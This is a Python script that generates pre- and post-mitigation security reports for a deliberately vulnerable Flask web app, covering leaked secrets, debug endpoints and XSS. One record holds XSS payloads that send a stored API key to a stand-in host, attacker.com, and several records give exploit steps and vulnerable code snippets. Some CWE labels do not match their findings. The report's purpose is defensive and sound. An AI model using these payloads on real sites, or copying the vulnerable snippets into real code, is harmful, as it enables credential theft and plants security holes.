"""
COMPREHENSIVE TEST REPORT GENERATOR
Generates detailed security test reports in JSON format
"""

import json
from datetime import datetime
from typing import Dict, List

class SecurityTestReport:
    """Generates comprehensive security test reports"""
    
    def __init__(self, version: str = "pre-mitigation"):
        self.version = version
        self.timestamp = datetime.now().isoformat()
        self.vulnerabilities = []
        
    def add_vulnerability(self, vuln_dict: Dict):
        """Add a vulnerability to the report"""
        self.vulnerabilities.append(vuln_dict)
    
    def generate_report(self) -> Dict:
        """Generate comprehensive report"""
        return {
            "report_metadata": {
                "version": self.version,
                "generated_at": self.timestamp,
                "report_type": "UI Security Assessment"
            },
            "vulnerabilities": self.vulnerabilities,
            "summary": self._generate_summary()
        }
    
    def _generate_summary(self) -> Dict:
        """Generate summary statistics"""
        return {
            "total_vulnerabilities": len(self.vulnerabilities),
            "critical": sum(1 for v in self.vulnerabilities if v.get("severity") == "critical"),
            "high": sum(1 for v in self.vulnerabilities if v.get("severity") == "high"),
            "medium": sum(1 for v in self.vulnerabilities if v.get("severity") == "medium"),
            "low": sum(1 for v in self.vulnerabilities if v.get("severity") == "low")
        }
    
    def save_report(self, filename: str):
        """Save report to JSON file"""
        report = self.generate_report()
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)


# Pre-defined vulnerability templates
VULNERABILITIES_PRE_MITIGATION = [
    {
        "id": "VUL-001",
        "name": "API Keys Exposed in Login Response",
        "severity": "critical",
        "cwe": "CWE-798: Use of Hard-Coded Credentials",
        "description": """
        API keys and other secrets are returned directly in the login API response
        in plaintext JSON. This allows attackers to easily extract credentials
        by intercepting or analyzing network traffic.
        """,
        "vulnerable_code": "/app/app.py - login() endpoint",
        "vulnerable_snippet": """
            return jsonify({
                "success": True,
                "user": username,
                "api_key": API_KEY,
                "stripe_key": STRIPE_KEY,
            })
        """,
        "exploit_steps": [
            "1. Send POST request to /login with valid credentials",
            "2. Capture response JSON",
            "3. Extract api_key, stripe_key, service_account from response",
            "4. Use extracted credentials to access protected resources"
        ],
        "expected_result": "Login should succeed with user session",
        "actual_result": "Login response contains hardcoded API keys in plaintext",
        "impact": "Complete compromise of API credentials leading to unauthorized access",
        "remediation": "Never return secrets in API responses; use environment variables",
        "test_url": "POST /login",
        "test_payload": '{"username": "admin", "password": "password123"}'
    },
    {
        "id": "VUL-002",
        "name": "Secrets Embedded in Frontend JavaScript",
        "severity": "critical",
        "cwe": "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code",
        "description": """
        API keys, Stripe keys, and other sensitive credentials are hardcoded in
        HTML templates as JavaScript variables. These are visible in browser
        DevTools, page source, and browser history.
        """,
        "vulnerable_code": "/templates/dashboard.html",
        "vulnerable_snippet": """
            <script>
            const API_KEY = "{{ api_key }}";
            const STRIPE_KEY = "{{ stripe_key }}";
            console.log('API Key:', API_KEY);
            </script>
        """,
        "exploit_steps": [
            "1. Navigate to /dashboard after login",
            "2. Open browser DevTools (F12)",
            "3. Check JavaScript console for hardcoded secrets",
            "4. Check page source for unescaped credentials",
            "5. Retrieve all API keys from frontend code"
        ],
        "expected_result": "No secrets in frontend code",
        "actual_result": "API keys, Stripe keys visible in page source and console",
        "impact": "Secrets accessible to any user viewing page source or using DevTools",
        "remediation": "NEVER embed secrets in frontend code; use secure backend endpoints",
        "test_url": "GET /dashboard",
        "evidence_location": "Browser console and page source"
    },
    {
        "id": "VUL-003",
        "name": "Unsafe File Preview - DOM XSS Vulnerability",
        "severity": "critical",
        "cwe": "CWE-79: Improper Neutralization of Input During Web Page Generation",
        "description": """
        The file preview endpoint accepts user input and directly renders it in
        HTML without sanitization. This allows attackers to inject malicious
        JavaScript that will execute in the victim's browser.
        """,
        "vulnerable_code": "/app/app.py - preview_file() endpoint",
        "vulnerable_snippet": """
            return jsonify({
                "html": f'''<div id="content">{file_content}</div>
                <script>document.getElementById('content').innerHTML = `{file_content}`;</script>'''
            })
        """,
        "exploit_steps": [
            "1. Prepare XSS payload: '<img src=x onerror=\"fetch('http://attacker.com?key=' + localStorage.api_key)\">'",
            "2. POST to /api/preview-file with payload as 'content' parameter",
            "3. Payload executes in response HTML",
            "4. Attacker receives victim's stored credentials via request"
        ],
        "expected_result": "Safe preview of file content",
        "actual_result": "Arbitrary JavaScript executes, allowing credential theft",
        "payload": '<img src=x onerror="alert(\'XSS\'); fetch(\'http://attacker.com/steal\')">',
        "impact": "Session hijacking, credential theft, malware injection",
        "remediation": "Sanitize all user input using MarkupSafe.escape() or similar",
        "test_url": "POST /api/preview-file"
    },
    {
        "id": "VUL-004",
        "name": "Client-Side Logging of Sensitive Information",
        "severity": "high",
        "cwe": "CWE-532: Insertion of Sensitive Information into Log File",
        "description": """
        Sensitive information including API keys, passwords, and session tokens
        are logged to the browser console using console.log(). This information
        can be viewed by any developer tool user or captured in browser logs.
        """,
        "vulnerable_code": "/templates/login.html, /templates/dashboard.html",
        "vulnerable_snippet": """
            console.log('Login attempt:', {
                username: username,
                password: password
            });
            console.log('API Key:', API_KEY);
            console.log('LocalStorage:', localStorage);
        """,
        "exploit_steps": [
            "1. Navigate to login page",
            "2. Open DevTools Console (F12)",
            "3. Attempt login",
            "4. View console output showing credentials and secrets",
            "5. Credentials remain in browser history"
        ],
        "expected_result": "No sensitive data in console logs",
        "actual_result": "Credentials, API keys, and session data logged to console",
        "impact": "Sensitive data accessible in browser logs and developer tools",
        "remediation": "Remove all console.log() statements containing sensitive data",
        "test_url": "GET /login, POST /login"
    },
    {
        "id": "VUL-005",
        "name": "Debug Endpoint Exposing All System Information",
        "severity": "critical",
        "cwe": "CWE-209: Information Exposure Through an Error Message",
        "description": """
        An unauthenticated /api/debug-info endpoint returns complete system
        information including all secrets, environment variables, Python version,
        working directory, and all application configuration.
        """,
        "vulnerable_code": "/app/app.py - debug_info() endpoint",
        "vulnerable_snippet": """
            @app.route('/api/debug-info')
            def debug_info():
                return jsonify({
                    "all_secrets": { "api_key": API_KEY, ... },
                    "app_config": dict(app.config),
                    "environment": dict(os.environ)
                })
        """,
        "exploit_steps": [
            "1. Send GET request to /api/debug-info (no authentication required)",
            "2. Response contains all secrets in JSON format",
            "3. Extract all API keys, database passwords, and config",
            "4. Use credentials for further attacks"
        ],
        "expected_result": "Endpoint should not exist or require authentication",
        "actual_result": "Complete system information exposed without authentication",
        "impact": "Complete system compromise through information disclosure",
        "remediation": "Remove all debug endpoints from production code",
        "test_url": "GET /api/debug-info"
    },
    {
        "id": "VUL-006",
        "name": "Source Code Disclosure",
        "severity": "high",
        "cwe": "CWE-534: Information Exposure Through Debug Log Output",
        "description": """
        An /api/source-code endpoint returns the full source code of the
        application, including all hardcoded credentials and implementation details.
        """,
        "vulnerable_code": "/app/app.py - source_code() endpoint",
        "exploit_steps": [
            "1. Send GET request to /api/source-code",
            "2. Receive complete application source code",
            "3. Extract all hardcoded credentials from code",
            "4. Identify other vulnerabilities from code review"
        ],
        "expected_result": "Source code should not be accessible via web",
        "actual_result": "Complete source code returned in JSON response",
        "impact": "Source code review enables targeted attacks and credential extraction",
        "remediation": "Never expose application source code through web endpoints",
        "test_url": "GET /api/source-code"
    },
    {
        "id": "VUL-007",
        "name": "Stack Trace and Error Information Leakage",
        "severity": "high",
        "cwe": "CWE-209: Information Exposure Through an Error Message",
        "description": """
        Error responses include full Python stack traces and system information,
        allowing attackers to understand the application architecture and identify
        further vulnerabilities.
        """,
        "vulnerable_code": "/app/app.py - handle_errors decorator",
        "vulnerable_snippet": """
            except Exception as e:
                return jsonify({
                    "error": str(e),
                    "traceback": traceback.format_exc(),
                    "debug_info": { "python_version": ..., "env_vars": ... }
                })
        """,
        "exploit_steps": [
            "1. Send malformed request to trigger error",
            "2. Response includes full Python traceback",
            "3. Response includes system info and environment variables",
            "4. Use information for further reconnaissance"
        ],
        "expected_result": "Generic error message without details",
        "actual_result": "Detailed stack trace and system info in error responses",
        "impact": "System reconnaissance and attack planning",
        "remediation": "Return generic error messages; log details server-side only"
    },
    {
        "id": "VUL-008",
        "name": "Database Credentials in Session and Responses",
        "severity": "critical",
        "cwe": "CWE-798: Use of Hard-Coded Credentials",
        "description": """
        Database passwords and other sensitive credentials are stored in
        user sessions and returned in API responses, making them accessible
        to attackers via session hijacking or response interception.
        """,
        "vulnerable_code": "/app/app.py - login() endpoint",
        "vulnerable_snippet": """
            session['db_pass'] = DATABASE_PASSWORD
            return jsonify({
                "database_password": DATABASE_PASSWORD,
                "session_data": dict(session)
            })
        """,
        "exploit_steps": [
            "1. Authenticate to application",
            "2. Call /api/user-data to get session data",
            "3. Extract database password from session",
            "4. Use database credentials for direct database access"
        ],
        "expected_result": "No database credentials in session or responses",
        "actual_result": "Database passwords returned in API responses",
        "impact": "Direct database access and complete data compromise",
        "remediation": "Never store or transmit database credentials to frontend"
    }
]

VULNERABILITIES_POST_MITIGATION = [
    {
        "id": "FIX-001",
        "name": "Secrets Management via Environment Variables",
        "severity": "fixed",
        "description": "All secrets are now retrieved from environment variables only",
        "implementation": "Using os.getenv() in get_secret() function",
        "verification": "No hardcoded credentials found in code"
    },
    {
        "id": "FIX-002",
        "name": "Input Sanitization and Output Encoding",
        "severity": "fixed",
        "description": "All user inputs are sanitized using MarkupSafe.escape()",
        "implementation": "sanitize_input() function applied to all endpoints",
        "verification": "XSS payloads are rendered as escaped text, not executed"
    },
    {
        "id": "FIX-003",
        "name": "Content Security Policy Headers",
        "severity": "fixed",
        "description": "CSP headers restrict script execution to same-origin only",
        "implementation": "Flask-Talisman middleware enforces strict CSP",
        "verification": "CSP headers present in all responses"
    },
    {
        "id": "FIX-004",
        "name": "Secure Session Management",
        "severity": "fixed",
        "description": "Sessions use httpOnly, Secure, and SameSite flags",
        "implementation": "Flask session config with secure cookie settings",
        "verification": "Session cookies are httpOnly and Secure"
    },
    {
        "id": "FIX-005",
        "name": "Debug Endpoints Removed",
        "severity": "fixed",
        "description": "All debug and source code endpoints have been removed",
        "implementation": "Removed /api/debug-info, /api/source-code endpoints",
        "verification": "Endpoints return 404 Not Found"
    },
    {
        "id": "FIX-006",
        "name": "Secure Error Handling",
        "severity": "fixed",
        "description": "Error responses return generic messages without details",
        "implementation": "Generic error handlers without stack traces",
        "verification": "Stack traces not exposed in error responses"
    },
    {
        "id": "FIX-007",
        "name": "No Secrets in API Responses",
        "severity": "fixed",
        "description": "API endpoints return only necessary user data",
        "implementation": "API responses filtered to exclude credentials",
        "verification": "No API keys, passwords, or internal URLs in responses"
    },
    {
        "id": "FIX-008",
        "name": "Secure Logging",
        "severity": "fixed",
        "description": "Logging configured to exclude sensitive data",
        "implementation": "No console.log() of credentials; server-side logging only",
        "verification": "Browser console clean; no credentials logged"
    }
]


def generate_pre_mitigation_report() -> str:
    """Generate pre-mitigation vulnerability report"""
    report = SecurityTestReport("pre-mitigation")
    for vuln in VULNERABILITIES_PRE_MITIGATION:
        report.add_vulnerability(vuln)
    
    filename = "pre_mitigation_report.json"
    report.save_report(filename)
    return filename


def generate_post_mitigation_report() -> str:
    """Generate post-mitigation patch report"""
    report = SecurityTestReport("post-mitigation")
    for fix in VULNERABILITIES_POST_MITIGATION:
        report.add_vulnerability(fix)
    
    filename = "post_mitigation_report.json"
    report.save_report(filename)
    return filename


if __name__ == "__main__":
    print("[*] Generating pre-mitigation vulnerability report...")
    pre_file = generate_pre_mitigation_report()
    print(f"[+] Saved to: {pre_file}")
    
    print("[*] Generating post-mitigation patch report...")
    post_file = generate_post_mitigation_report()
    print(f"[+] Saved to: {post_file}")
    
    print("\n[+] Reports generated successfully!")
